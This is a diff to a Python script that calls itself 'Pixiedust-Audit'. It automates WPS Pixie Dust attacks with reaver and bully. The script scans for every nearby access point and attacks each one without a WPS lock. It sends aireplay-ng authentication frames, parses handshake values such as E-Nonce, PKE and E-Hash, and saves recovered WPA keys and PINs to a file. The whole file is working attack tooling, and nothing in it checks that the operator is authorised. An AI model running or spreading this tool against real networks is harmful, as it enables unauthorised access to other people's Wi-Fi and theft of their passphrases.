@@ -7,7 +7,9 @@ import pandas
 import os
 import os.path
 import multiprocessing
+import argparse
 
+line=""
 attackmode=0
 bssid=0
 channel=0
@@ -29,6 +31,13 @@ keycount = 0
 network_max = 0
 DN = open(os.devnull, 'w')
 
+parser = argparse.ArgumentParser('Pixiedust-Audit, Attackmodes: reaver | bully')
+parser.add_argument('-I', '--interface')
+parser.add_argument('-A', '--attackmode')
+args = parser.parse_args()
+interface=args.interface
+attackmode=str(args.attackmode)
+
 def reset():
    global ENonce, RNonce, PKE, PKR, AuthKey, EHash1, EHash2, PIN, PWD
    ENonce = ""
@@ -42,17 +51,17 @@ def reset():
    PWD = ""
    return 0
 
-def monitor():
+def monitor(i):
    global interface
    try:
       subprocess.Popen(['airmon-ng', 'check', 'kill'], stdout=DN, stderr=DN)
       time.sleep(5)
       clear()
-      subprocess.call(['airmon-ng'])
-      interface=input("Choice: ")
+      #subprocess.call(['airmon-ng'])
+      #interface=input("Choice: ")
       clear()
-      subprocess.call(['airmon-ng', 'start', interface], stdout=DN, stderr=DN)
-      interface=interface+'mon'
+      subprocess.call(['airmon-ng', 'start', i], stdout=DN, stderr=DN)
+      interface=i+'mon'
       clear()
       return interface
    except KeyboardInterrupt:
@@ -65,7 +74,7 @@ def scan():
    global network_max
    try:
       timeout = time.time() + 60*3
-      subprocess.Popen(['wash', '-i', interface, '--ignore-fcs', '-P' , '-o', 'temp.csv'], stdout=DN, stderr=DN)
+      subprocess.Popen(['wash', '-i', interface, '-P' , '-o', 'temp.csv'], stdout=DN, stderr=DN)
       time.sleep(5)
       while True:
          if time.time() > timeout:
@@ -78,12 +87,12 @@ def scan():
          print ("Found",str(row_count),"Networks")
          time.sleep(3)
       subprocess.Popen(['killall', 'wash'], stdout=DN, stderr=DN)
-      subprocess.Popen(["sed -i 's/|/,/g' temp.csv"], stdout=DN, stderr=DN, shell=True)
-      subprocess.Popen(["sed -i 's/ //g' temp.csv"], stdout=DN, stderr=DN, shell=True)
+      #subprocess.Popen(["sed -i 's/|/,/g' temp.csv"], stdout=DN, stderr=DN, shell=True)
+      #subprocess.Popen(["sed -i 's/ //g' temp.csv"], stdout=DN, stderr=DN, shell=True)
    except KeyboardInterrupt:
       subprocess.Popen(['killall', 'wash'], stdout=DN, stderr=DN)
-      subprocess.Popen(["sed -i 's/|/,/g' temp.csv"], stdout=DN, stderr=DN, shell=True)
-      subprocess.Popen(["sed -i 's/ //g' temp.csv"], stdout=DN, stderr=DN, shell=True)
+      #subprocess.Popen(["sed -i 's/|/,/g' temp.csv"], stdout=DN, stderr=DN, shell=True)
+      #subprocess.Popen(["sed -i 's/ //g' temp.csv"], stdout=DN, stderr=DN, shell=True)
       return 0
 		
 def choose():
@@ -92,7 +101,7 @@ def choose():
       clear()
       count=0
       with open('temp.csv', "r") as ifile:
-         cr = pandas.read_csv('temp.csv', names=['BSSID','Channel','Signal','WPS-Version','Locked','SSID'])
+         cr = pandas.read_csv('temp.csv',sep='|', names=['BSSID','Channel','Signal','WPS-Version','Locked','SSID'])
          print(cr)
          choice=input('Choice: ')
          clear()
@@ -109,7 +118,7 @@ def auto(attackmode):
    counter = 0
    try:
       with open('temp.csv', "r") as ifile:
-         cr = pandas.read_csv('temp.csv', names=['BSSID','Channel','Signal','WPS-Version','Locked','SSID'])
+         cr = pandas.read_csv('temp.csv',sep='|', names=['BSSID','Channel','Signal','WPS-Version','Locked','SSID'])
          for index, row in cr.iterrows():
             bssid=row['BSSID']
             channel=row['Channel']
@@ -122,30 +131,26 @@ def auto(attackmode):
                print('Skipping %s due to locked WPS' % (bssid))
                time.sleep(5)
                continue
-            if attackmode == 2:
+            if attackmode == "bully":
                b = multiprocessing.Process(target=bully, name="bully")
                b.start()
                b.join(190)
                if b.is_alive():
                   b.terminate()
                   b.join()
-                  subprocess.call(['killall', 'bully'])
-                  subprocess.call(['killall', 'aireplay-ng'])
-            else:
+                  kill()
+            elif attackmode == "reaver":
                b = multiprocessing.Process(target=reaver, name="reaver")
                b.start()
                b.join(190)
                if b.is_alive():
                   b.terminate
                   b.join
-                  subprocess.call(['killall', 'reaver'])
-                  subprocess.call(['killall', 'aireplay-ng'])
+                  kill()
    except KeyboardInterrupt:
       clear()
       reset()
-      subprocess.call(['killall', 'bully'])
-      subprocess.call(['killall', 'reaver'])
-      subprocess.call(['killall', 'aireplay-ng'])
+      kill()
       return 0
    except:
       print("Unexpected error:", sys.exc_info()[0])
@@ -153,19 +158,96 @@ def auto(attackmode):
    print('%i Keys have been recovered' % (keycount))
    time.sleep(10)
 
+def kill():
+   subprocess.call(['killall', '-s', str(6), 'airodump-ng'], stderr=DN)
+   subprocess.call(['killall', '-s', str(6), 'reaver'], stderr=DN)
+   subprocess.call(['killall', '-s', str(6), 'aireplay-ng'], stderr=DN)
+   subprocess.call(['killall', '-s', str(6), 'bully'], stderr=DN)
+   return 0
+
+def bully():
+   global choice, bssid, ssid, keycount, channel, ENonce, RNonce, PKE, PKR, AuthKey, EHash1, EHash2, PIN, PWD
+   try:
+      clear()
+      print('Trying to recover %s Key' % (bssid))
+      kill()
+      time.sleep(3)
+      cmd2 = ['aireplay-ng', "-1", str(4), '-a', bssid, interface]
+      time.sleep(5)
+      cmd3 = ['bully', '-b', bssid, '-c', str(channel), '-v', str(4), '-d', interface]
+      timeout = time.time() + 60
+      proc = subprocess.Popen(cmd3, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+      stdout = []
+      subprocess.Popen(cmd2, stdout=DN, stderr=DN)
+      while True:
+         line = proc.stdout.readline()
+         stdout.append(line)
+         if time.time() > timeout:
+            break
+         elif b"ENonce" in line and ENonce == "":
+            ENonce=line.decode().split(':',1)[1]
+            print("E-Nonce: found")
+            print(ENonce)
+         elif b"PKE" in line and PKE == "":
+            PKE=line.decode().split(':',1)[1]
+            print("PKE: found")
+            print(PKE)
+         elif b"RNonce" in line and RNonce == "":
+            RNonce=line.decode().split(':',1)[1]
+            print("R-Nonce: found")
+            print(RNonce)
+         elif b"PKR" in line and PKR == "":
+            PKR=line.decode().split(':',1)[1]
+            print("PKR: found")
+            print(PKR)
+         elif b"AuthKey" in line and AuthKey == "":
+            AuthKey=line.decode().split(':',1)[1]
+            print("AuthKey: found")
+            print(AuthKey)
+         elif b"E-Hash1" in line and EHash1 == "":
+            EHash1=line.decode().split(':',1)[1]
+            print("E-Hash1: found")
+            print(EHash1)
+         elif b"E-Hash2" in line and EHash2 == "":
+            EHash2=line.decode().split(':',1)[1]
+            print("E-Hash2: found")
+            print(EHash2)
+         elif b"PIN" in line and PIN == "":
+            PIN=line.decode().split(':',1)[1]
+            print("WPS Pin: found")
+            print(PIN)
+         elif b"KEY" in line and PWD == "":
+            PWD=line.decode().split(':',1)[1]
+            print("Key recovered!")
+            keycount = keycount + 1
+            text_file = open("bees.txt", "a")
+            text_file.write("SSID: %s\nBSSID: %s\nKey: %sPin: %s\n\n" % (ssid, bssid, PWD, PIN))
+            text_file.close()
+            kill()
+            time.sleep(10)
+            break
+         if line == '' and proc.poll() != None:
+            kill()
+            break
+      return 0
+   except KeyboardInterrupt:
+      kill()
+   except:
+      print("Unexpected error:", sys.exc_info()[0])
+      raise
+   reset()
+
 def reaver():
    global choice, bssid, ssid, keycount, channel, ENonce, RNonce, PKE, PKR, AuthKey, EHash1, EHash2, PIN, PWD
    try:
       clear()
       print('Trying to recover %s Key' % (bssid))
-      subprocess.call(['killall', 'airodump-ng'], stderr=DN)
-      subprocess.call(['killall', 'reaver'], stderr=DN)
-      subprocess.call(['killall', 'aireplay-ng'], stderr=DN)
+      kill()
       time.sleep(3)
       cmd2 = ['aireplay-ng', "-1", str(4), '-a', bssid, interface]
       time.sleep(5)
-      cmd3 = ['reaver', '-i', interface, '-b', bssid, '-c', str(channel), '-vvv',  "-L", "-a", "-A", "-P", '-K', str(1)]
-      timeout = time.time() + 60*3
+      cmd3 = ['reaver', '-i', interface, '-b', bssid, '-c', str(channel), '-vvv',  "-L", "-A", "-P", "-K", str(1)]
+      timeout = time.time() + 60
       proc = subprocess.Popen(cmd3, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
       stdout = []
       subprocess.Popen(cmd2, stdout=DN, stderr=DN)
@@ -178,66 +260,65 @@ def reaver():
             ENonce=line.decode().split(':',1)[1]
             print("E-Nonce: found")
             print(ENonce)
-         if b"PKE" in line and PKE == "":
+         elif b"PKE" in line and PKE == "":
             PKE=line.decode().split(':',1)[1]
             print("PKE: found")
             print(PKE)
-         if b"R-Nonce" in line and RNonce == "":
+         elif b"R-Nonce" in line and RNonce == "":
             RNonce=line.decode().split(':',1)[1]
             print("R-Nonce: found")
             print(RNonce)
-         if b"PKR" in line and PKR == "":
+         elif b"PKR" in line and PKR == "":
             PKR=line.decode().split(':',1)[1]
             print("PKR: found")
             print(PKR)
-         if b"AuthKey" in line and AuthKey == "":
+         elif b"AuthKey" in line and AuthKey == "":
             AuthKey=line.decode().split(':',1)[1]
             print("AuthKey: found")
             print(AuthKey)
-         if b"E-Hash1" in line and EHash1 == "":
+         elif b"E-Hash1" in line and EHash1 == "":
             EHash1=line.decode().split(':',1)[1]
             print("E-Hash1: found")
             print(EHash1)
-         if b"E-Hash2" in line and EHash2 == "":
+         elif b"E-Hash2" in line and EHash2 == "":
             EHash2=line.decode().split(':',1)[1]
             print("E-Hash2: found")
             print(EHash2)
-         if b"WPS pin" in line and PIN == "":
+         elif b"WPS pin" in line and PIN == "":
             PIN=line.decode().split(':',4)[1]
             print("WPS Pin: found")
             print(PIN)
-         if b"WPA PSK" in line:
+         elif b"WPA PSK" in line and PWD == "":
             PWD=line.decode().split(':',1)[1]
             print("Key recovered!")
             keycount = keycount + 1
             text_file = open("bees.txt", "a")
             text_file.write("SSID: %s\nBSSID: %s\nKey: %sPin: %s\n\n" % (ssid, bssid, PWD, PIN))
             text_file.close()
-            subprocess.call(['killall', 'aireplay-ng'], stderr=DN)
-            subprocess.call(['killall', 'reaver'], stderr=DN)
-            time.sleep(10) 
+            kill()
+            time.sleep(10)
+            break
          if line == '' and proc.poll() != None:
-            subprocess.call(['killall', 'airodump-ng'], stderr=DN)
-            subprocess.call(['killall', 'reaver'], stderr=DN)
-            subprocess.call(['killall', 'aireplay-ng'], stderr=DN)
+            kill()
             break
       return 0
    except KeyboardInterrupt:
-      subprocess.call(['killall', 'airodump-ng'])
-      subprocess.call(['killall', 'reaver'])
-      subprocess.call(['killall', 'aireplay-ng'])
+      kill()
    except:
       print("Unexpected error:", sys.exc_info()[0])
       raise
    reset()
-		
+
 
 clear()
-
 if os.path.isfile("bees.txt"):
 	pass
 else:
 	subprocess.call(['touch', 'bees.txt'])
+#if os.path.isfile("temp.csv"):
+#   pass
+#else:
+#   subprocess.call(['touch', 'temp.csv'])
 #while x != 99:
 #        if interface == 0:
 #            print("Interface: none")
@@ -266,15 +347,13 @@ else:
 #	if x == 5:
 #	    auto(1)//
 
-monitor()
+monitor(interface)
 scan()
-auto(1)
+auto(attackmode)
 
-subprocess.call(['killall', 'airodump-ng'])
-subprocess.call(['killall', 'reaver'])
-subprocess.call(['killall', 'aireplay-ng'])
+kill()
 subprocess.call(['airmon-ng', 'stop', interface], stdout=DN)
 subprocess.call(['service', 'network-manager', 'restart'])
 subprocess.call(['rm', 'temp.csv'])
-subprocess.call(['rm', '/root/.bully/*.run'])
+subprocess.call(['rm', '/root/.bully/*'])
 quit()
